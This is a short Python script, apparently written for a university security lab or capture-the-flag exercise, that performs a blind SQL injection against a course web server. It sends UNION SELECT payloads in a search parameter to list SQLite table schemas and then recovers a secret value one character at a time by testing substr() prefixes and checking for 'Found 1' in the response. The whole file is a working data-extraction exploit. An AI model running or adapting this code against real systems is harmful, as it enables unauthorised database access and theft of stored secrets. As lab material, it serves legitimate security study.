import requests
import string


SERVER = f'http://mustard.stt.rnl.tecnico.ulisboa.pt:22262/'

# payload = "null' UNION Select name, tbl_name, sql from sqlite_master where substr(tbl_name,1,%d) = '%s' --"
# payload = "null' UNION Select name, tbl_name, sql from sqlite_master where tbl_name='super_s_sof_secrets' AND substr(sql,1,%d) = '%s' --"
# payload = "%dnull' UNION Select name, tbl_name, sql from sqlite_master where tbl_name='super_s_sof_secrets' AND sql LIKE '%s%%' --"
payload = "null' UNION Select id, null, secret from super_s_sof_secrets where substr(secret,1,%d) = '%s' --"
#### GET REQUESTS
headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits  + string.punctuation
characters = characters.replace("%", "")
characters = characters.replace("_", "")
characters = ' ' + characters
characters += '_'

print(characters)
# haracters = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
text = ""
finished = False

while finished != True:
    print(payload %(len(text), text))
    for attempt in characters:
        # print(attempt)
        params = {'search' : payload %(len(text+attempt), text+attempt)}
        r = requests.get(SERVER, params=params, headers=headers)
        # print(r.headers)
        # print(r.text)

        if "Found 1" in r.text:
            text += attempt
            break
        elif attempt == characters[-1]:
            # end loop no match. break outter loop
            finished = True

# make sure its correct:
params = {'search' : payload %(len(text), text)}
r = requests.get(SERVER, params=params, headers=headers)
if "Found 1" in r.text:
    print("CORRECT!")
    print(text)


# #### ANSWERS
# print(f'status     : {r.status_code}')
# print(f'headers    : {r.headers}')
# print(f'cookies    : {r.cookies}')
# print(f'html       : {r.text}')
